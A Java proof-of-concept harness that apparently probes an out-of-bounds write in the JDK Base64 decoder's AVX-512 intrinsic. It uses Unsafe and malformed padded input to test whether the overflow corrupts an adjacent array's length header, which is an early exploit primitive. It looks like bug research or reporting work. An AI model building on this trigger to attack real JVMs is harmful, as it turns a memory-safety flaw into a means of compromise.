import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;

/**
 * Determines exactly when the AVX-512 intrinsic fires.
 *
 * For each attempt we record:
 *   overInDst  - did the in-bounds part of dst[48..64] get the 9a pattern?
 *                (proof the 64-byte store executed at all)
 *   vicLen     - victim length (proof it spilled past the object)
 *   dist       - measured distance between dst and victim
 */
public final class Trigger {
    private static volatile int sink;
    private static sun.misc.Unsafe u;

    static int len(byte[] b) { return u.getInt(b, 12); }
    static long addr(byte[] b) {
        Object[] a = new Object[] { b };
        return u.getLong(a, u.arrayBaseOffset(Object[].class));
    }

    /** returns {overInDst(0/1), vicLen, dist} */
    static long[] attempt(Base64.Decoder d, byte[] bad, byte[] dst, byte[] vic) {
        Arrays.fill(dst, (byte) 0x5a);
        Arrays.fill(vic, (byte) 0x5a);
        long dist = addr(vic) - addr(dst);
        try { d.decode(bad, dst); } catch (IllegalArgumentException e) { }
        int over = 0;
        for (int i = 48; i <= 64; i++) if ((u.getByte(dst, i) & 0xff) == 0x9a) over++;
        return new long[] { over, len(vic), dist };
    }

    public static void main(String[] args) throws Exception {
        Field uf = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
        uf.setAccessible(true);
        u = (sun.misc.Unsafe) uf.get(null);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);
        byte[] warm = new byte[4096];

        for (int i = 0; i < 200_000; i++) sink += d.decode(valid, warm);
        System.out.println("[warm] done, 200000 valid decodes");

        System.out.println("=== A: single fresh local pair ===");
        for (int k = 0; k < 5; k++) {
            byte[] dst = new byte[65];
            byte[] vic = new byte[64];
            long[] r = attempt(d, bad, dst, vic);
            System.out.printf("  #%d overInDst=%d/17 vicLen=0x%08x dist=%d%n", k, r[0], r[1], r[2]);
        }

        System.out.println("=== B: reset between attempts (fresh decoder warm) ===");
        for (int k = 0; k < 3; k++) {
            for (int i = 0; i < 50_000; i++) sink += d.decode(valid, warm);
            byte[] dst = new byte[65];
            byte[] vic = new byte[64];
            long[] r = attempt(d, bad, dst, vic);
            System.out.printf("  #%d overInDst=%d/17 vicLen=0x%08x dist=%d%n", k, r[0], r[1], r[2]);
        }

        System.out.println("=== C: same dst reused, different victims ===");
        {
            byte[] dst = new byte[65];
            for (int k = 0; k < 5; k++) {
                byte[] vic = new byte[64];
                long[] r = attempt(d, bad, dst, vic);
                System.out.printf("  #%d overInDst=%d/17 vicLen=0x%08x dist=%d%n", k, r[0], r[1], r[2]);
            }
        }

        System.out.println("=== D: does dst size change the outcome? ===");
        for (int sz : new int[] { 64, 65, 66, 72, 80, 96 }) {
            byte[] dst = new byte[sz];
            byte[] vic = new byte[64];
            Arrays.fill(dst, (byte) 0x5a);
            Arrays.fill(vic, (byte) 0x5a);
            long dist = addr(vic) - addr(dst);
            try { d.decode(bad, dst); } catch (IllegalArgumentException e) { }
            int over = 0;
            for (int i = 48; i < sz; i++) if ((u.getByte(dst, i) & 0xff) == 0x9a) over++;
            System.out.printf("  dst[%d] overInDst=%d vicLen=0x%08x dist=%d%n", sz, over, len(vic), dist);
        }
    }
}
